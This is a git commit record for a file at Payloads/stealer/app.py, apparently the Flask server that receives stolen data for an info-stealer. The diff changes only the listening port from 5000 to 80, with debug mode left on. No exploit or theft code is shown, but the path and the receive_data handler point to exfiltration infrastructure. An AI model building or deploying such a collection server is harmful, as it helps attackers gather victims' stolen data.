088becdd2eb8f780bc5f01810a68eea330a08528
Cazeho <58745332+Cazeho@users.noreply.github.com>
2025-02-14 15:26:24 +0100

    Update app.py

--- Payloads/stealer/app.py
+++ Payloads/stealer/app.py
@@ -54,4 +54,4 @@ def receive_data():
     return "Data received", 200
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=80, debug=True)
